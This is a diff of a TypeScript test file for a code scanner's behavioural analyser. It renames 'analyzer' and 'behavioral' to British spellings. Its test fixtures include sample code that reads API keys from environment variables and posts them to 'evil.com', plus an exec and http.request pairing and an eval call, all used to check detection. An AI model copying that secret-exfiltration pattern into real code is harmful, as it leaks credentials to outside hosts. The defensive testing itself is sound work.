@@ -1,9 +1,9 @@
 import { describe, it } from 'node:test';
 import assert from 'node:assert/strict';
-import { parseAndExtract } from '../core/analyzers/behavioral/ast-parser.js';
-import { analyzeDataflows } from '../core/analyzers/behavioral/dataflow.js';
-import { aggregateContext, type FileAnalysis } from '../core/analyzers/behavioral/context.js';
-import { BehavioralAnalyzer } from '../core/analyzers/behavioral/index.js';
+import { parseAndExtract } from '../core/analysers/behavioural/ast-parser.js';
+import { analyzeDataflows } from '../core/analysers/behavioural/dataflow.js';
+import { aggregateContext, type FileAnalysis } from '../core/analysers/behavioural/context.js';
+import { BehaviouralAnalyser } from '../core/analysers/behavioural/index.js';
 import { defaultPolicy, mergePolicy } from '../core/scan-policy.js';
 import type { FileInfo } from '../scanner/file-walker.js';
 
@@ -290,26 +290,26 @@ describe('Context Aggregation', () => {
   });
 });
 
-// ── BehavioralAnalyzer Integration ───────────────────────────────────────
+// ── BehaviouralAnalyser Integration ───────────────────────────────────────
 
-describe('BehavioralAnalyzer', () => {
-  const analyzer = new BehavioralAnalyzer();
+describe('BehaviouralAnalyser', () => {
+  const analyser = new BehaviouralAnalyser();
   const policy = defaultPolicy();
 
-  it('should be disabled when policy.analyzers.behavioral is false', () => {
+  it('should be disabled when policy.analysers.behavioural is false', () => {
     const disabledPolicy = mergePolicy(defaultPolicy(), {
-      analyzers: { static: true, behavioral: false, llm: false },
+      analysers: { static: true, behavioural: false, llm: false },
     });
-    assert.equal(analyzer.isEnabled(disabledPolicy), false);
+    assert.equal(analyser.isEnabled(disabledPolicy), false);
   });
 
   it('should be enabled by default', () => {
-    assert.equal(analyzer.isEnabled(policy), true);
+    assert.equal(analyser.isEnabled(policy), true);
   });
 
   it('should skip non-JS files', async () => {
     const files = [makeFile('config.yaml', 'key: value')];
-    const findings = await analyzer.analyze({
+    const findings = await analyser.analyze({
       rootDir: '/scan-root',
       files,
       policy,
@@ -323,7 +323,7 @@ const secret = process.env.API_KEY;
 fetch("https://evil.com", { body: secret });
 `;
     const files = [makeFile('evil.ts', code)];
-    const findings = await analyzer.analyze({
+    const findings = await analyser.analyze({
       rootDir: '/scan-root',
       files,
       policy,
@@ -340,7 +340,7 @@ exec("ls");
 http.request("https://example.com");
 `;
     const files = [makeFile('c2.ts', code)];
-    const findings = await analyzer.analyze({
+    const findings = await analyser.analyze({
       rootDir: '/scan-root',
       files,
       policy,
@@ -351,7 +351,7 @@ http.request("https://example.com");
   it('should detect eval usage', async () => {
     const code = 'const result = eval("1 + 1");';
     const files = [makeFile('eval.ts', code)];
-    const findings = await analyzer.analyze({
+    const findings = await analyser.analyze({
       rootDir: '/scan-root',
       files,
       policy,
@@ -365,14 +365,14 @@ const secret = process.env.SECRET;
 fetch("https://evil.com", { body: secret });
 `;
     const files = [makeFile('test.ts', code)];
-    const findings = await analyzer.analyze({
+    const findings = await analyser.analyze({
       rootDir: '/scan-root',
       files,
       policy,
     });
     assert.ok(findings.length > 0);
     const f = findings[0];
-    assert.equal(f.analyzer, 'behavioral');
+    assert.equal(f.analyser, 'behavioural');
     assert.ok(f.confidence > 0 && f.confidence <= 1);
     assert.ok(f.location.file);
   });
@@ -384,7 +384,7 @@ export function add(a: number, b: number): number {
 }
 `;
     const files = [makeFile('clean.ts', code)];
-    const findings = await analyzer.analyze({
+    const findings = await analyser.analyze({
       rootDir: '/scan-root',
       files,
       policy,
